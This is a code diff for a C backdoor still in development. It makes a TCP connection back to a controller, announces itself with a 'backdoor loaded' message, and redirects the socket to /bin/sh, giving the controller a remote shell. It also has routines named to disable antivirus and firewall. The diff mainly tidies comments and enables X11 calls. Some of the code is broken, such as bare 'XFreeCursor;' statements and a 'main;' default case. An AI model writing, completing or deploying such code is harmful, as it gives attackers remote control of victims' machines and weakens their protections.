@@ -30,7 +30,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 #include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
-//#include <X11/Xlib.h>
+#include <X11/Xlib.h>
 
 #define remote_addr "127.0.0.1"
 #define remote_port 2222
@@ -46,8 +46,8 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
   typedef struct {
 
-  char REMOTE_ADDR; /*remote_addr */
-  int REMOTE_PORT; /* remote port */
+  char REMOTE_ADDR; 
+  int REMOTE_PORT;
   char commands[bytes];
   int x;
   //FILE *filecmd;
@@ -55,7 +55,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   } Target;
 
   int x = true;
-
 
   void
   error (char *err)
@@ -65,14 +64,14 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
   perror(err);
   exit(EXIT_FAILURE);
 
-  } /* exit without exceptions... and keep the routine.
-  //function  to disable antivirus. */
+  } 
+
+  //function  to disable antivirus. /
 
   void
   kill_antivirus()
 
   {
-     //int i;
      FILE *arq;
 
     arq = fopen("av.txt", "rb");
@@ -135,7 +134,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
     {
 
-    //XFreeCursor; //magic happens here
+    XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -197,7 +196,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
     char *window[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
     char *cmd[] = { "/bin/sh", (char *)0 };
 
-  //  XFreeCursor; //magic happens here
+    XFreeCursor; //magic happens here
 
     pid_t pid;
 
@@ -257,7 +256,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      /* fck, now  i have power!
       made conditions here. */
-     if(recv(x,command,bytes,NULL) == true)
+     if(recv(x,command,bytes,0) == true)
 //     backdoor_connect();
      send(x,"\n...\n **\n ** backdoor loaded...",33,0), send(x,"\n Connected in machine \n\n",25,0);
 
@@ -271,7 +270,7 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      else
 
-     if(recv(x,command,bytes,NULL) > 0);
+     if(recv(x,command,bytes,0) > 0);
 
    //  XFreeCursor;
      dup2(x, 0),dup2(x, 1),dup2(x, 2);
@@ -279,31 +278,28 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      return;
 
-     //free(x); /* freedom for x! */
-
      }
 
 }
-
      /* execute the program */
 
      int main(int argc, char **argv)
 
      {
+      
       char command[bytes], bufaux[bytes], *loc;
       int tbuf, escolha;
       char comandos[]="/shell /help";
       struct sockaddr_in s;
-//      background_life();
+
      {
 
         /* setting up the connection */
-     //void (background_life());
-    // do {
-     x = socket(AF_INET, SOCK_STREAM, 0); /* create a socket */
+
+     x = socket(AF_INET, SOCK_STREAM, 0); 
 
      memset(s.sin_zero, '\0', sizeof s.sin_zero);
-     s.sin_family = AF_INET; /* família de protocolos */
+     s.sin_family = AF_INET; 
      s.sin_addr.s_addr = inet_addr(remote_addr);
      s.sin_port = htons(remote_port);
      malloc(sizeof (x));
@@ -324,17 +320,17 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      }
      do
      {
-
+     // send msg to server 
      strcpy(command,"\n...\n $$ Backdoor connected \n\n~$ ");
      strcpy(bufaux,command);
      send(x,command,strlen(command), 0);
 
-    // Recebe ack do cli
-     tbuf = recv(x, command,bytes, 0);
+    // Recv ack from controller
+     tbuf = recv(x, command,4096, 0);
      command[tbuf]=0x00;
      //fprintf(stdout,">: %s\n",command);
 
-    } while((tbuf=recv(x,command,bytes,0) > 0));
+    } while((tbuf=recv(x,command,4096,0) > 0));
      command[tbuf]=0x00;
 
      if (strncmp(command,"/",1) == 0)
@@ -352,21 +348,19 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
      case 1:
 
-     while(true)
      shell();
-
+     break;
 
      case 2:
-
-     while(true)
+    
      kill_antivirus();
-
+     break;
 
      case 3:
 
-     while(true)
      kill_firewall();
-
+     break;
+		   
      default:
              main;
 
@@ -378,4 +372,4 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      while(true);
 
 
-    }
+}
